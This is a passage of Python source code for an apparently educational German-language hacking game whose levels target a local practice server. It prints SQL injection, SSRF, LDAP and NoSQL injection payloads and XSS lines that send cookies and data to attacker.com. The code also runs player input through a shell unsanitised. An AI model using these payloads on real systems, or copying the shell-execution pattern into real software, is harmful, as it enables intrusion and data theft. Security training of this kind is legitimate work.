        self.simulate_old_terminal("   • Web Application Firewall (WAF) für zusätzlichen Schutz", delay=0.02)
        self.score += 150

    def level_2_network_fundamentals(self):
        """Level 2: Network Discovery & Reconnaissance with real server communication"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende Netzwerk-Rekonnaissance durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Hacking-Techniken für Network Discovery!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(2)

        # Get platform-specific commands
        commands = self.get_platform_commands()

        # Comprehensive Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: Network Discovery & Reconnaissance")
        print("="*70)
        print(f"\n🔍 PORT SCANNING ({sys.platform.upper()}):")
        if sys.platform.startswith('win'):
            print(f"   {commands['port_scan']}     → Port Status prüfen")
            print(f"   {commands['port_scan_alt']}           → Port Connectivity Test")
            print(f"   {commands['port_scan_ps']}")
            print(f"   {commands['http_headers']}  → HTTP Service Detection")
        else:
            print(f"   {commands['port_scan']}              → Stealth SYN Scan")
            print(f"   {commands['port_scan_alt']}              → TCP Connect Scan")
            print(f"   {commands['port_scan_udp']}              → UDP Scan")
            print(f"   {commands['port_scan_all']}              → Alle Ports scannen")
            print(f"   {commands['port_scan_service']}              → Service Detection")
            print(f"   {commands['port_scan_os']}               → OS Detection")

        print(f"\n🌐 WEB APPLICATION SCANNING ({sys.platform.upper()}):")
        print(f"   {commands['web_scan']}  → Basic Web Scan")
        if not sys.platform.startswith('win'):
            print(f"   {commands['web_scan_nikto']}  → Vulnerability Scanner")
            print(f"   {commands['web_scan_dirb']}     → Directory Brute-Force")
            print(f"   {commands['web_scan_gobuster']}")
        print(f"   {commands['http_methods']} → HTTP Methods")
        if sys.platform.startswith('win'):
            print(f"   {commands['web_scan_ps']}")

        print("\n🔍 ADVANCED VULNERABILITY TESTING:")
        print("   curl -X POST -d 'url=http://localhost:22' http://127.0.0.1:5000/ssrf")
        print("   curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
        print("   curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
        print("   curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")
        print(f"\n🔍 SERVICE ENUMERATION ({sys.platform.upper()}):")
        print(f"   {commands['http_headers']}  → HTTP Headers analysieren")
        print(f"   {commands['http_methods']} → HTTP Methods")
        print(f"   {commands['web_scan']}  → Silent HTTP Request")
        print("\n🎯 ZIEL: Finde den API-Key durch Network Discovery: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den API-Key: {target_value[:8]}...")
        print("💻 Verwende echte Network Discovery Tools")

        print("\n🎯 MISSION: Scanne den Server und finde versteckte Endpunkte!")
        print("💡 HINWEIS: Der API-Key ist in einem versteckten Endpunkt versteckt!")
        print("🔍 VERSUCHE: curl http://127.0.0.1:5000/api/secret oder ähnliche Endpunkte!")
        print("💡 TIPP: Manche Endpunkte brauchen spezielle Authentifizierung...")
        print("🔍 DENKE NACH: Was hast du in Level 1 gelernt?")

        while True:
            print(f"\n💡 VERFÜGBARE TOOLS ({sys.platform.upper()}):")
            if sys.platform.startswith('win'):
                print("  - netstat (Port Status Analysis)")
                print("  - telnet (Port Connectivity Test)")
                print("  - curl (HTTP Analysis)")
                print("  - powershell (Advanced Network Commands)")
                print("  - findstr (Text Search)")
            else:
                print("  - nmap (Port Scanning, Service Detection)")
                print("  - nikto (Web Vulnerability Scanner)")
                print("  - dirb/gobuster (Directory Brute-Force)")
                print("  - curl (HTTP Analysis)")
                print("  - netstat (Local Port Analysis)")
            print("\n🔍 ADVANCED VULNERABILITY TESTING:")
            print("  - SSRF: curl -X POST -d 'url=http://localhost:22' http://127.0.0.1:5000/ssrf")
            print("  - Command Injection: curl -X POST -d 'cmd=whoami' http://127.0.0.1:5000/command")
            print("  - LDAP Injection: curl -X POST -d 'username=admin)(&(password=*' http://127.0.0.1:5000/ldap")
            print("  - NoSQL Injection: curl -X POST -d 'username=admin&password={\"$ne\":null}' http://127.0.0.1:5000/nosql")

            cmd = input("\nGib deinen Reconnaissance-Befehl ein: ").strip()

            if cmd == "/echo":
                self.echo_chat("hint")
                continue
            elif cmd == "/help":
                self.show_level_help(2)
                continue

            try:
                # Execute the command with proper encoding handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=20, encoding='utf-8', errors='replace')

                # Show realistic command output
                print(f"\n💻 {self.player_name}@hacking-target:~$ {cmd}")

                # Enhanced curl command handling with real server communication
                if "curl" in cmd.lower() and ("127.0.0.1:5000" in cmd or "localhost:5000" in cmd):
                    server_response = self.execute_curl_command(cmd)
                    if server_response:
                        print("📄 SERVER ANTWORT:")
                        print(server_response)

                        # Check for success indicators in real server response
                        if self.check_level_success(2, server_response, cmd):
                            print(f"\n🎉 ERFOLG! Du hast den API-Key gefunden: {target_value}")
                            print("🏆 Level 2 abgeschlossen! +150 Punkte")
                            print("\n📚 WAS DU GELERNT HAST:")
                            print("   • Port Scanning mit nmap")
                            print("   • Service Detection und Enumeration")
                            print("   • Web Application Vulnerability Scanning")
                            print("   • Directory Brute-Forcing")
                            print("   • HTTP Header Analysis")
                            print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                            print("   • API-Keys nie im Code hardcoden")
                            print("   • Rate-Limiting für API-Endpunkte")
                            print("   • IP-Whitelisting für sensible APIs")
                            print("   • API-Key-Rotation regelmäßig durchführen")
                            print("   • API-Gateway mit Authentifizierung verwenden")
                            self.score += 150
                            break
                    else:
                        print("📄 (Keine Antwort vom Server)")
                else:
                    # Handle non-curl commands
                    if result.stdout:
                        print("📄 AUSGABE:")
                        print(result.stdout)
                    elif result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                        print("⚠️  FEHLER:")
                        print(result.stderr)
                    else:
                        print("📄 (Keine Ausgabe)")

                    # Check for success in non-curl command output
                    if self.check_level_success(2, result.stdout or "", cmd):
                        print(f"\n🎉 ERFOLG! Du hast den API-Key gefunden: {target_value}")
                        print("🏆 Level 2 abgeschlossen! +150 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Port Scanning mit nmap")
                        print("   • Service Detection und Enumeration")
                        print("   • Web Application Vulnerability Scanning")
                        print("   • Directory Brute-Forcing")
                        print("   • HTTP Header Analysis")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • API-Keys nie im Code hardcoden")
                        print("   • Rate-Limiting für API-Endpunkte")
                        print("   • IP-Whitelisting für sensible APIs")
                        print("   • API-Key-Rotation regelmäßig durchführen")
                        print("   • API-Gateway mit Authentifizierung verwenden")
                        self.score += 150
                        break



            except subprocess.TimeoutExpired:
                print("⏰ Befehl ist abgelaufen. Probiere einen anderen Ansatz.")
            except Exception as e:
                print(f"❌ Befehl fehlgeschlagen: {e}")

        print("\n✅ Level 2 abgeschlossen!")
        self.current_level = 3

    def level_3_password_cracking(self):
        """Level 3: SQL Injection Attack with real server communication - REALISTIC APPROACH"""
        self.simulate_old_terminal("\n🔐 MISSION: Führe eine umfassende SQL Injection Attack durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte SQL Injection-Techniken!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(3)

        # Comprehensive SQL Injection Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: SQL Injection Attack Techniques")
        print("="*70)
        print("\n🎯 UNION-BASED SQL INJECTION:")
        print("   admin' UNION SELECT 1,2,3,4,5--")
        print("   admin' UNION SELECT username,password,email,role,id FROM users--")
        print("   admin' UNION SELECT table_name,column_name,1,2,3 FROM information_schema.columns--")
        print("\n🔍 BOOLEAN-BASED BLIND SQL INJECTION:")
        print("   admin' AND 1=1--")
        print("   admin' AND 1=2--")
        print("   admin' AND (SELECT COUNT(*) FROM users) > 0--")
        print("   admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a'--")
        print("\n⏰ TIME-BASED BLIND SQL INJECTION:")
        print("   admin' AND (SELECT SLEEP(5))--")
        print("   admin' AND (SELECT IF(1=1,SLEEP(5),0))--")
        print("\n❌ ERROR-BASED SQL INJECTION:")
        print("   admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--")
        print("\n🎯 ZIEL: Extrahiere den Admin-Hash: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Admin-Hash: {target_value[:8]}...")
        print("💻 Verwende verschiedene SQL Injection-Techniken")

        print("\n🎯 REALISTISCHE METHODEN:")
        print("   • Browser: Gehe zu http://127.0.0.1:5000/login und gib Payload in Username-Feld ein")
        print("   • Curl: curl -X POST -d 'username=PAYLOAD&password=test' http://127.0.0.1:5000/login")
        print("   • Beide Methoden funktionieren gleich - wähle was dir lieber ist!")
        print("\n🎯 BEISPIEL-PAYLOADS:")
        print("   • admin' OR '1'='1' --")
        print("   • admin' UNION SELECT 1,2,3 --")
        print("   • ' OR 1=1 --")

        while True:
            print("\n💡 VERFÜGBARE TECHNIQUEN:")
            print("  - Union-based SQL Injection")
            print("  - Boolean-based Blind SQL Injection")
            print("  - Time-based Blind SQL Injection")
            print("  - Error-based SQL Injection")
            print("  - Second-order SQL Injection")
            print("\n🔍 ADVANCED ATTACK VECTORS:")
            print("  - Race Condition: curl -X POST -d 'amount=500' http://127.0.0.1:5000/race")
            print("  - Business Logic: curl -X POST -d 'product_id=1&quantity=5&price=-100' http://127.0.0.1:5000/business-logic")
            print("  - Auth Bypass: curl -X POST -d 'user_id=1' http://127.0.0.1:5000/auth-bypass")

            cmd = input("\nGib deinen SQL Injection Befehl ein (Browser oder curl): ").strip()

            if cmd == "/echo":
                self.echo_chat("hint")
                continue
            elif cmd == "/help":
                self.show_level_help(3)
                continue

            # Auto-convert simple URLs to curl commands for better UX
            if cmd.startswith("http://") or cmd.startswith("http://"):
                cmd = f"curl -s {cmd}"
                print(f"💡 Auto-converting to: {cmd}")

            try:
                # Execute the command with proper encoding handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=15, encoding='utf-8', errors='replace')

                # Show realistic command output
                print(f"\n💻 {self.player_name}@hacking-target:~$ {cmd}")

                # Enhanced curl command handling with real server communication
                if "curl" in cmd.lower() and ("127.0.0.1:5000" in cmd or "localhost:5000" in cmd):
                    server_response = self.execute_curl_command(cmd)
                    if server_response:
                        print("📄 SERVER ANTWORT:")
                        print(server_response)

                        # Check for success indicators in real server response
                        if self.check_level_success(3, server_response, cmd):
                            print("\n🎉 ERFOLG! SQL Injection hat funktioniert!")
                            print("🏆 Level 3 abgeschlossen! +200 Punkte")
                            print("\n📚 WAS DU GELERNT HAST:")
                            print("   • Union-based SQL Injection")
                            print("   • Blind SQL Injection (Boolean & Time-based)")
                            print("   • Error-based SQL Injection")
                            print("   • Database Schema Enumeration")
                            print("   • Data Extraction Techniques")
                            print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                            print("   • Prepared Statements verwenden (niemals String-Konkatenation)")
                            print("   • Input-Validierung und -Sanitization")
                            print("   • ORM-Frameworks verwenden")
                            print("   • Least Privilege Principle für DB-User")
                            print("   • WAF (Web Application Firewall) einsetzen")
                            self.score += 200
                            break
                    else:
                        print("📄 (Keine Antwort vom Server)")
                else:
                    # Handle non-curl commands
                    if result.stdout:
                        print("📄 AUSGABE:")
                        print(result.stdout)
                    elif result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                        print("⚠️  FEHLER:")
                        print(result.stderr)
                    else:
                        print("📄 (Keine Ausgabe)")

                    # Check for success in non-curl command output
                    if self.check_level_success(3, result.stdout or "", cmd):
                        print("\n🎉 ERFOLG! SQL Injection hat funktioniert!")
                        print("🏆 Level 3 abgeschlossen! +200 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Union-based SQL Injection")
                        print("   • Blind SQL Injection (Boolean & Time-based)")
                        print("   • Error-based SQL Injection")
                        print("   • Database Schema Enumeration")
                        print("   • Data Extraction Techniques")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • Prepared Statements verwenden (niemals String-Konkatenation)")
                        print("   • Input-Validierung und -Sanitization")
                        print("   • ORM-Frameworks verwenden")
                        print("   • Least Privilege Principle für DB-User")
                        print("   • WAF (Web Application Firewall) einsetzen")
                        self.score += 200
                        break

            except subprocess.TimeoutExpired:
                print("⏰ Request ist abgelaufen.")
            except Exception as e:
                print(f"❌ Request fehlgeschlagen: {e}")

        print("\n✅ Level 3 abgeschlossen!")
        self.current_level = 4

    def level_4_web_exploitation(self):
        """Level 4: XSS (Cross-Site Scripting) Attack with real server communication"""
        self.simulate_old_terminal("\n🌐 MISSION: Führe eine umfassende XSS Attack durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte XSS-Techniken und Filter-Bypass!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(4)

        # Comprehensive XSS Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: XSS (Cross-Site Scripting) Attack Techniques")
        print("="*70)
        print("\n🎯 REFLECTED XSS:")
        print("   <script>alert('XSS')</script>")
        print("   <img src=x onerror=alert('XSS')>")
        print("   <svg onload=alert('XSS')>")
        print("   <iframe src=javascript:alert('XSS')>")
        print("\n💾 STORED XSS:")
        print("   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>")
        print("   <img src=x onerror=this.src='http://attacker.com/steal.php?cookie='+document.cookie>")
        print("\n🌐 DOM-BASED XSS:")
        print("   <script>eval(location.hash.substring(1))</script>")
        print("   <script>setTimeout('alert(\\'XSS\\')', 1000)</script>")
        print("\n🔍 FILTER BYPASS TECHNIQUES:")
        print("   <ScRiPt>alert('XSS')</ScRiPt>")
        print("   <script>alert(String.fromCharCode(88,83,83))</script>")
        print("   <script>alert(/XSS/.source)</script>")
        print("   <script>alert`XSS`</script>")
        print("\n🎯 ZIEL: Extrahiere Session-Cookie: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Session-Cookie: {target_value[:8]}...")
        print("💻 Verwende verschiedene XSS-Techniken")

        while True:
            print("\n💡 VERFÜGBARE XSS-TECHNIQUEN:")
            print("  - Reflected XSS")
            print("  - Stored XSS")
            print("  - DOM-based XSS")
            print("  - Filter Bypass")
            print("  - Session Hijacking")
            print("\n🔍 ADVANCED XSS PAYLOADS:")
            print("  - <script>fetch('/api/users').then(r=>r.text()).then(d=>fetch('http://attacker.com/steal?data='+btoa(d)))</script>")
            print("  - <img src=x onerror=\"fetch('/api/admin/data').then(r=>r.text()).then(d=>alert('Admin Data: '+d))\">")
            print("  - <svg onload=\"fetch('/files/flag.txt').then(r=>r.text()).then(d=>alert('Flag: '+d))\">")

            payload = input("\nGib deine XSS-Payload ein: ").strip()

            if payload == "/echo":
                self.echo_chat("hint")
                continue
            elif payload == "/help":
                self.show_level_help(4)
                continue

            # Auto-convert simple URLs to curl commands for better UX
            if payload.startswith("http://") or payload.startswith("http://"):
                payload = f"curl -s {payload}"
                print(f"💡 Auto-converting to: {payload}")

            try:
                # Test XSS with curl
                cmd = f"curl -X POST -d 'comment={payload}' http://127.0.0.1:5000/comments"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=10, encoding='utf-8', errors='replace')

                print("📄 SERVER ANTWORT:")
                if result.stdout:
                    print(result.stdout)
                else:
                    print("(Keine Ausgabe)")

                # Only show error if there's actual stderr content (not just curl progress info)
                if result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                    print("⚠️  FEHLER:")
                    print(result.stderr)

                # Enhanced success checking with real server response
                server_response = self.execute_curl_command(cmd)
                if server_response:
                    print("📄 ECHTE SERVER ANTWORT:")
                    print(server_response)

                    # Check for success indicators in real server response
                    if self.check_level_success(4, server_response, cmd):
                        print("\n🎉 ERFOLG! XSS Attack hat funktioniert!")
                        print("🏆 Level 4 abgeschlossen! +250 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Reflected XSS")
                        print("   • Stored XSS")
                        print("   • DOM-based XSS")
                        print("   • Filter Bypass Techniques")
                        print("   • Session Hijacking")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • Input-Escaping und Output-Encoding")
                        print("   • Content Security Policy (CSP) Headers")
                        print("   • HTTPOnly und Secure Flags für Cookies")
                        print("   • DOM Sanitization Libraries verwenden")
                        print("   • Template-Engines mit Auto-Escaping")
                        self.score += 250
                        break



            except subprocess.TimeoutExpired:
                print("⏰ Request ist abgelaufen.")
            except Exception as e:
                print(f"❌ Request fehlgeschlagen: {e}")

        print("\n✅ Level 4 abgeschlossen!")
        self.current_level = 5

    def level_5_advanced_topics(self):
        """Level 5: Digital Forensics & Advanced Hacking with real server communication"""
        self.simulate_old_terminal("\n🔬 MISSION: Führe eine umfassende Forensik-Analyse durch!", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Lerne echte Forensik-Techniken und Advanced Hacking!", delay=0.02)
        self.echo_chat("hint")

        # Get the target value for this level
        target_value = self.get_target_value(5)

        # Comprehensive Forensics Tutorial
        print("\n" + "="*70)
        print("📚 TUTORIAL: Digital Forensics & Advanced Hacking")
        print("="*70)
        print("\n🔍 MEMORY ANALYSIS (Windows):")
        print("   tasklist /v                    → Process List mit Details")
        print("   wmic process get name,pid,commandline → Process Command Lines")
        print("   powershell Get-Process | Select-Object Name,Id,Path")
        print("\n🌐 NETWORK TRAFFIC ANALYSIS (Windows):")
        print("   netstat -anb                    → Network Connections mit Prozessen")
        print("   netstat -an | findstr :5000     → Specific Port Analysis")
        print("   powershell Get-NetTCPConnection | Where-Object {$_.LocalPort -eq 5000}")
        print("\n🔐 CRYPTOGRAPHY ATTACKS (Windows):")
        print("   certutil -hashfile file.txt MD5 → File Hashing")
        print("   powershell Get-FileHash file.txt -Algorithm MD5")
        print("   powershell ConvertFrom-SecureString → Decrypt Secure Strings")
        print("\n🕵️ MALWARE ANALYSIS (Windows):")
        print("   strings malware.exe             → String Extraction")
        print("   file malware.exe                → File Type Detection")
        print("   powershell Get-ItemProperty malware.exe | Select-Object *")
        print("   objdump -d malware.exe")
        print("   strace -e trace=all ./malware")
        print("\n🎯 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
        print("="*70)

        print(f"\n🔍 ZIEL: Finde den Encryption-Key: {target_value[:8]}...")
        print("💻 Verwende echte Forensik-Tools")

        while True:
            print(f"\n💡 VERFÜGBARE FORENSIK-TOOLS ({sys.platform.upper()}):")
            if sys.platform.startswith('win'):
                print("  - Tasklist (Process Analysis)")
                print("  - Netstat (Network Analysis)")
                print("  - Certutil (Cryptography)")
                print("  - PowerShell (Advanced Analysis)")
                print("  - Strings (String Extraction)")
                print("  - WMIC (System Information)")
                print("\n🔍 ADVANCED FORENSIC TECHNIQUES (Windows):")
                print("  - Process Analysis: tasklist /v | findstr suspicious")
                print("  - Network Forensics: netstat -anb | findstr :5000")
                print("  - File Analysis: powershell Get-ItemProperty file.exe | Select-Object *")
                print("  - Registry Analysis: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
            else:
                print("  - Volatility (Memory Analysis)")
                print("  - Wireshark/tshark (Network Analysis)")
                print("  - John the Ripper (Password Cracking)")
                print("  - Hashcat (Advanced Password Cracking)")
                print("  - OpenSSL (Cryptography)")
                print("  - Strings (String Extraction)")
                print("\n🔍 ADVANCED FORENSIC TECHNIQUES (Linux/Mac):")
                print("  - Memory Analysis: volatility -f memory.dump --profile=Win7SP1x64 pslist")
                print("  - Network Forensics: tshark -r capture.pcap -Y 'http.request.method==POST'")
                print("  - Steganography: steghide extract -sf hidden.jpg")
                print("  - File Carving: foremost -i disk.img -o output/")

            cmd = input("\nGib deinen Forensik-Befehl ein: ").strip()

            if cmd == "/echo":
                self.echo_chat("hint")
                continue
            elif cmd == "/help":
                self.show_level_help(5)
                continue

            # Auto-convert simple URLs to curl commands for better UX
            if cmd.startswith("http://") or cmd.startswith("http://"):
                cmd = f"curl -s {cmd}"
                print(f"💡 Auto-converting to: {cmd}")

            try:
                # Execute the command with proper encoding handling
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                    timeout=30, encoding='utf-8', errors='replace')

                # Show realistic command output
                print(f"\n💻 {self.player_name}@hacking-target:~$ {cmd}")

                # Enhanced curl command handling with real server communication
                if "curl" in cmd.lower() and ("127.0.0.1:5000" in cmd or "localhost:5000" in cmd):
                    server_response = self.execute_curl_command(cmd)
                    if server_response:
                        print("📄 SERVER ANTWORT:")
                        print(server_response)

                        # Check for success indicators in real server response
                        if self.check_level_success(5, server_response, cmd):
                            print("\n🎉 ERFOLG! Du hast den Encryption-Key gefunden!")
                            print("🏆 Level 5 abgeschlossen! +300 Punkte")
                            print("\n📚 WAS DU GELERNT HAST:")
                            print("   • Memory Analysis mit Volatility")
                            print("   • Network Traffic Analysis")
                            print("   • Password Cracking mit John/Hashcat")
                            print("   • Cryptography und Encryption")
                            print("   • Malware Analysis")
                            print("   • Digital Forensics")
                            print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                            print("   • Starke Verschlüsselung verwenden (AES-256)")
                            print("   • Key-Management-Systeme (HSM) einsetzen")
                            print("   • Regular Security Audits durchführen")
                            print("   • Logging und Monitoring aktivieren")
                            print("   • Incident Response Plan bereithalten")
                            self.score += 300
                            break
                    else:
                        print("📄 (Keine Antwort vom Server)")
                else:
                    # Handle non-curl commands
                    if result.stdout:
                        print("📄 AUSGABE:")
                        print(result.stdout)
                    elif result.stderr and result.stderr.strip() and not result.stderr.startswith('  % Total'):
                        print("⚠️  FEHLER:")
                        print(result.stderr)
                    else:
                        print("📄 (Keine Ausgabe)")

                    # Check for success in non-curl command output
                    if self.check_level_success(5, result.stdout or "", cmd):
                        print("\n🎉 ERFOLG! Du hast den Encryption-Key gefunden!")
                        print("🏆 Level 5 abgeschlossen! +300 Punkte")
                        print("\n📚 WAS DU GELERNT HAST:")
                        print("   • Memory Analysis mit Volatility")
                        print("   • Network Traffic Analysis")
                        print("   • Password Cracking mit John/Hashcat")
                        print("   • Cryptography und Encryption")
                        print("   • Malware Analysis")
                        print("   • Digital Forensics")
                        print("\n🛡️ SO KANNST DU DICH DAVOR SCHÜTZEN:")
                        print("   • Starke Verschlüsselung verwenden (AES-256)")
                        print("   • Key-Management-Systeme (HSM) einsetzen")
                        print("   • Regular Security Audits durchführen")
                        print("   • Logging und Monitoring aktivieren")
                        print("   • Incident Response Plan bereithalten")
                        self.score += 300
                        break



            except subprocess.TimeoutExpired:
                print("⏰ Befehl ist abgelaufen. Probiere einen anderen Ansatz.")
            except Exception as e:
                print(f"❌ Befehl fehlgeschlagen: {e}")

        print("\n🎉 ALLE LEVEL ABGESCHLOSSEN!")
        print("🏆 Du bist jetzt ein echter White Hat Hacking-Meister!")
        print(f"💰 FINAL SCORE: {self.score} Punkte")
        print("\n🛡️ Du hast gelernt:")
        print("   • Web Application Security Testing")
        print("   • Network Discovery und Reconnaissance")
        print("   • SQL Injection, XSS, SSRF, Command Injection")
        print("   • LDAP Injection, NoSQL Injection")
        print("   • Race Conditions und Business Logic Flaws")
        print("   • Digital Forensics und Malware Analysis")
        print("   • Ethische Hacking-Techniken")
        print("\n🔒 Vergiss nie: Mit großer Macht kommt große Verantwortung!")
        print("   Nutze dein Wissen nur für ethische Zwecke!")
        print("\n[Echo] Perfekt, Daddy! Du hast dein Erbe verdient!")
        print("       Willkommen in der Welt der ethischen Hacker! 🖤")

if __name__ == "__main__":
    try:
        # Initialize game
        game = HackingGame()

        # Get player name
        game.get_player_name()

        # Show main menu
        game.show_menu()

    except KeyboardInterrupt:
        print("\n\n🛑 Spiel durch Benutzer beendet...")
        try:
            if 'game' in locals() and hasattr(game, 'stop_server'):
                game.stop_server()
        except:
            pass
        print("👋 Auf Wiedersehen!")
    except Exception as e:
        print(f"\n❌ Fehler beim Starten des Spiels: {e}")
        print("💡 Versuche es erneut oder kontaktiere den Support.")
        try:
            input("Drücke Enter zum Beenden...")
        except:
            pass
